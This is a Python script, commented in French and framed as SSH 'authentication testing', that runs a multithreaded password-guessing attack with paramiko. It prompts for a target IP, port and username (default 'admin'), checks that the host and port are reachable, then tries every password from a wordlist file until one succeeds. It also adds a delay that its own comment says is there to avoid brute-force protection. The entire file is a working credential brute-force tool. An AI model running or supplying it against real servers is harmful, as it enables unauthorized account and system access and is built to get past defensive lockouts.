import paramiko
import time
import threading
import socket
import subprocess
from queue import Queue, Empty
from halo import Halo
from colorama import Fore, Style

# Fonction pour vérifier si une IP est joignable via ping
def is_host_reachable(ip):
    resp = subprocess.call(["ping", ip], stdout=subprocess.PIPE)
    return resp

# Fonction pour vérifier si un port est ouvert
def is_port_open(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    try:
        sock.connect((ip, port))
        return True
    except socket.error:
        return False
    finally:
        sock.close()

def authentification_testing():
    # Fonction pour tester l'authentification SSH
    def test_ssh_authentication(ip, port, username, password, delay):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            ssh.connect(ip, port=port, username=username, password=password, timeout=10)
            return True, f"Authentication successful for {username}:{password} on {ip}:{port}"
        except paramiko.AuthenticationException:
            return False, f"Authentication failed for {username}:{password} on {ip}:{port}"
        except paramiko.SSHException as e:
            # Gestion de l'erreur de bannière SSH
            print(f"{Fore.RED}>>> [!] Erreur de protocole SSH : {e}\nVérifiez que le service SSH est activé sur la cible.{Style.RESET_ALL}")
            stop_event.set()  # Arrête tous les threads en cas d'échec SSH
            return False, f"SSH error occurred: {e}"
        except ConnectionResetError:
            # Gestion de l'erreur de connexion réinitialisée
            print(f"{Fore.RED}>>> [!] Connexion réinitialisée par l'hôte.\nVérifiez que le service SSH de la cible est opérationnel.{Style.RESET_ALL}")
            stop_event.set()  # Arrête tous les threads en cas d'échec de connexion
            return False, "Connection was reset by the host"
        except Exception as e:
            return False, f"Error occurred: {e}"
        finally:
            ssh.close()
            time.sleep(delay)  # Delay to prevent triggering brute-force protection mechanisms

    # Fonction pour exécuter des tests d'authentification en parallèle
    def worker(ip, port, username, password_queue, delay, attempts_tracker, stop_event):
        while not stop_event.is_set():
            try:
                password = password_queue.get_nowait()
            except Empty:
                break

            success, message = test_ssh_authentication(ip, port, username, password, delay)
            with attempts_tracker['lock']:
                attempts_tracker['count'] += 1
            if success:
                print(f"\n\033[1;32m[✔] {message}\033[0m")  # Message de succès en vert
                stop_event.set()  # Stop other threads
                break
            password_queue.task_done()

    # Demander l'IP cible à l'utilisateur
    print("\n" + "╔" + "═" * 29 + "╗")
    print("║ Test d'authentification SSH ║")
    print("╚" + "═" * 29 + "╝")
    ip = input("\n\033[1;36mEntrez l'IP cible : \033[0m")

    # Vérification si l'IP est joignable via ping
    if is_host_reachable(ip) == 1:
        print(f"{Fore.RED}[!] La cible {ip} n'est pas joignable.{Style.RESET_ALL}")
        return

    # Demander le port avec une valeur par défaut de 22
    port_input = input("\033[1;36mEntrez le port (par défaut 22) : \033[0m")
    port = int(port_input) if port_input else 22

    # Vérification si le port est ouvert
    if not is_port_open(ip, port):
        print(f"{Fore.RED}[!] Le port {port} sur {ip} n'est pas ouvert.{Style.RESET_ALL}")
        return

    # Demander le nom d'utilisateur avec une valeur par défaut de 'admin'
    username_input = input("\033[1;36mEntrez le nom d'utilisateur (par défaut 'admin') : \033[0m")
    username = username_input if username_input else "admin"

    # Lire la liste des mots de passe à partir du fichier passwords.txt
    with Halo(text='Chargement de la liste des mots de passe', spinner='dots'):
        with open('includes/passwords.txt', 'r') as file:
            password_list = [line.strip() for line in file.readlines()]

    # Délai entre les tentatives
    delay_between_attempts = 2  # 2 seconds delay between attempts

    # Création de la queue de mots de passe
    password_queue = Queue()
    for password in password_list:
        password_queue.put(password)

    # Nombre de threads à utiliser
    num_threads = 5

    # Initialisation du compteur de tentatives et d'un événement d'arrêt
    attempts_tracker = {'count': 0, 'lock': threading.Lock()}
    stop_event = threading.Event()

    # Lancement des tests avec un loader Halo
    total_passwords = len(password_list)
    spinner = Halo(text=f'Test d\'authentification en cours... Tentatives : 0/{total_passwords}', spinner='dots')
    spinner.start()

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=worker, args=(ip, port, username, password_queue, delay_between_attempts, attempts_tracker, stop_event))
        thread.start()
        threads.append(thread)

    try:
        # Mise à jour continue du nombre de tentatives sur la même ligne
        while any(thread.is_alive() for thread in threads) and not stop_event.is_set():
            with attempts_tracker['lock']:
                spinner.text = f"Test d'authentification en cours... Tentatives : {attempts_tracker['count']}/{total_passwords}"
            time.sleep(0.1)  # Mettre à jour toutes les 0.1 secondes
    except KeyboardInterrupt:
        # Gestion de l'interruption par Ctrl + C
        print("\n\033[1;31m[!] Interruption du processus par l'utilisateur.\033[0m")
        stop_event.set()
    finally:
        # Attente de la fin de tous les threads
        for thread in threads:
            thread.join()
        if stop_event.is_set() and not any(thread.is_alive() for thread in threads):
            spinner.fail("Test d'authentification interrompu.")
        else:
            spinner.succeed("Test d'authentification réussi.")
        spinner.stop()

    print("\n>>>>>> Processus terminé.")

if __name__ == "__main__":
    authentification_testing()
